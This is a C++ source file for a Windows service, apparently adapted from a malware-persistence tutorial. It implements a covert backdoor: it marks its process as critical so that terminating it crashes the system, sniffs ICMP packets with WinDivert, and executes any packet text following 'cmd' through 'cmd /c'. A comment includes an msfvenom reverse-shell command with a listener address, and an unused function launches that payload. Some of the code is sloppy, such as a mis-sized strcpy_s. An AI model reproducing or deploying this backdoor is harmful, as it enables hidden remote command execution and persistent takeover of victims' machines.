/*
meowsrv.cpp
windows high level persistence via windows services
author: @cocomelonc
https://cocomelonc.github.io/tutorial/2022/05/09/malware-pers-4.html
*/
#include <stdio.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "windivert.h"

#define ntohs(x)            WinDivertHelperNtohs(x)
#define ntohl(x)            WinDivertHelperNtohl(x)

#define MAXBUF              0xFFFF
#define INET6_ADDRSTRLEN    45
typedef VOID(_stdcall* RtlSetProcessIsCritical) (
    IN BOOLEAN        NewValue,
    OUT PBOOLEAN OldValue,
    IN BOOLEAN     IsWinlogon);
#define SLEEP_TIME 5000

SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);

// run process meow.exe - reverse shell
int RunMeow() {
    void* lb;
    BOOL rv;
    HANDLE th;

    // for example: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4445 -f exe > meow.exe
    LPWSTR cmd = (LPWSTR)"Z:\\2022-05-09-malware-pers-4\\meow.exe";
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    return 0;
}

int main() {
    SERVICE_TABLE_ENTRY ServiceTable[] = {
      {(LPWSTR)"MeowService", (LPSERVICE_MAIN_FUNCTION)ServiceMain},
      {NULL, NULL}
    };

    StartServiceCtrlDispatcher(ServiceTable);
    return 0;
}

void ServiceMain(int argc, char** argv) {
    serviceStatus.dwServiceType = SERVICE_WIN32;
    serviceStatus.dwCurrentState = SERVICE_START_PENDING;
    serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    serviceStatus.dwWin32ExitCode = 0;
    serviceStatus.dwServiceSpecificExitCode = 0;
    serviceStatus.dwCheckPoint = 0;
    serviceStatus.dwWaitHint = 0;

    hStatus = RegisterServiceCtrlHandler((LPCWSTR)"MeowService", (LPHANDLER_FUNCTION)ControlHandler);
    //RunMeow();

    serviceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &serviceStatus);
    // Initialize service stuff
    HANDLE hDLL;
    RtlSetProcessIsCritical fSetCritical;

    hDLL = LoadLibraryA("ntdll.dll");
    if (hDLL != NULL)
    {
        (fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
        fSetCritical(1, 0, 0);
    }
    HANDLE handle, console;
    UINT i;
    INT16 priority = 0;
    unsigned char packet[MAXBUF];
    UINT packet_len;
    WINDIVERT_ADDRESS addr;
    PWINDIVERT_IPHDR ip_header;
    PWINDIVERT_IPV6HDR ipv6_header;
    PWINDIVERT_ICMPHDR icmp_header;
    PWINDIVERT_ICMPV6HDR icmpv6_header;
    PWINDIVERT_TCPHDR tcp_header;
    PWINDIVERT_UDPHDR udp_header;
    UINT32 src_addr[4], dst_addr[4];
    UINT64 hash;
    char src_str[INET6_ADDRSTRLEN + 1], dst_str[INET6_ADDRSTRLEN + 1];
    const char* err_str;
    LARGE_INTEGER base, freq;
    double time_passed;

    const char* filter = "icmp";
    const char* thousand = "1000";
    priority = (INT16)atoi(thousand);


    // Get console for pretty colors.
    console = GetStdHandle(STD_OUTPUT_HANDLE);

    // Divert traffic matching the filter:
    handle = WinDivertOpen(filter, WINDIVERT_LAYER_NETWORK, priority,
        WINDIVERT_FLAG_SNIFF);
    if (handle == INVALID_HANDLE_VALUE)
    {
        if (GetLastError() == ERROR_INVALID_PARAMETER &&
            !WinDivertHelperCompileFilter(filter, WINDIVERT_LAYER_NETWORK,
                NULL, 0, &err_str, NULL))
        {
            fprintf(stderr, "error: invalid filter \"%s\"\n", err_str);
            exit(EXIT_FAILURE);
        }
        fprintf(stderr, "error: failed to open the WinDivert device (%d)\n",
            GetLastError());
        exit(EXIT_FAILURE);
    }

    // Max-out the packet queue:
    if (!WinDivertSetParam(handle, WINDIVERT_PARAM_QUEUE_LENGTH,
        WINDIVERT_PARAM_QUEUE_LENGTH_MAX))
    {
        fprintf(stderr, "error: failed to set packet queue length (%d)\n",
            GetLastError());
        exit(EXIT_FAILURE);
    }
    if (!WinDivertSetParam(handle, WINDIVERT_PARAM_QUEUE_TIME,
        WINDIVERT_PARAM_QUEUE_TIME_MAX))
    {
        fprintf(stderr, "error: failed to set packet queue time (%d)\n",
            GetLastError());
        exit(EXIT_FAILURE);
    }
    if (!WinDivertSetParam(handle, WINDIVERT_PARAM_QUEUE_SIZE,
        WINDIVERT_PARAM_QUEUE_SIZE_MAX))
    {
        fprintf(stderr, "error: failed to set packet queue size (%d)\n",
            GetLastError());
        exit(EXIT_FAILURE);
    }

    // Set up timing:
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&base);
    while (serviceStatus.dwCurrentState == SERVICE_RUNNING) {
        // Read a matching packet.
        if (!WinDivertRecv(handle, packet, sizeof(packet), &packet_len, &addr))
        {
            fprintf(stderr, "warning: failed to read packet (%d)\n",
                GetLastError());
            continue;
        }

        // Print info about the matching packet.
        WinDivertHelperParsePacket(packet, packet_len, &ip_header, &ipv6_header,
            NULL, &icmp_header, &icmpv6_header, &tcp_header, &udp_header, NULL,
            NULL, NULL, NULL);
        if (ip_header == NULL && ipv6_header == NULL)
        {
            fprintf(stderr, "warning: junk packet\n");
        }

        // Dump packet info: 
        putchar('\n');
        SetConsoleTextAttribute(console, FOREGROUND_RED);
        time_passed = (double)(addr.Timestamp - base.QuadPart) /
            (double)freq.QuadPart;
        hash = WinDivertHelperHashPacket(packet, packet_len, 0);
        printf("Packet [Timestamp=%.8g, Direction=%s IfIdx=%u SubIfIdx=%u "
            "Loopback=%u Hash=0x%.16llX]\n",
            time_passed, (addr.Outbound ? "outbound" : "inbound"),
            addr.Network.IfIdx, addr.Network.SubIfIdx, addr.Loopback, hash);

        if (icmp_header != NULL)
        {
            SetConsoleTextAttribute(console, FOREGROUND_RED);
            printf("ICMP [Type=%u Code=%u Checksum=0x%.4X Body=0x%.8X]\n",
                icmp_header->Type, icmp_header->Code,
                ntohs(icmp_header->Checksum), ntohl(icmp_header->Body));
            // create process
            STARTUPINFO si = { sizeof(STARTUPINFO) };
            PROCESS_INFORMATION pi;

        }

        SetConsoleTextAttribute(console, FOREGROUND_GREEN | FOREGROUND_BLUE);
        for (i = 0; i < packet_len; i++)
        {
            if (i % 20 == 0)
            {
                printf("\n\t");
            }
            printf("%.2X", (UINT8)packet[i]);
        }
        SetConsoleTextAttribute(console, FOREGROUND_RED | FOREGROUND_BLUE);
        for (i = 0; i < packet_len; i++)
        {
            if (i % 40 == 0)
            {
                printf("\n\t");
            }
            if (isprint(packet[i]))
            {
                if (packet[i] == 'c' && packet[i + 1] == 'm' && packet[i + 2] == 'd')
                {
                    int cmd_len = packet_len - (i + 4);
                    char* cmd = (char*)malloc((cmd_len + 1) * sizeof(char));
                    int j = 7;
                    char* in_cmd = (char*)malloc((cmd_len + 1 + 7) * sizeof(char));
                    const char* as = "cmd /c ";
                    //strcpy(in_cmd, as);
                    strcpy_s(in_cmd, sizeof(as), as);
                    for (i = i + 4; i < packet_len; i++)
                    {
                        in_cmd[j] = packet[i];
                        putchar(in_cmd[j]);
                        j += 1;
                    }
                    in_cmd[j] = '\0';
                    printf("asdf");
                    WinExec(in_cmd, NULL);
                    free(cmd);
                    free(in_cmd);
                }
            }
        }
        putchar('\n');
        SetConsoleTextAttribute(console,
            FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        //Sleep(SLEEP_TIME);
    }
    return;
}

void ControlHandler(DWORD request) {
    switch (request) {
    case SERVICE_CONTROL_STOP:
        serviceStatus.dwWin32ExitCode = 0;
        serviceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &serviceStatus);
        return;

    case SERVICE_CONTROL_SHUTDOWN:
        serviceStatus.dwWin32ExitCode = 0;
        serviceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &serviceStatus);
        return;

    default:
        break; //COM DLL hijack
    }
    SetServiceStatus(hStatus, &serviceStatus);
    return;
}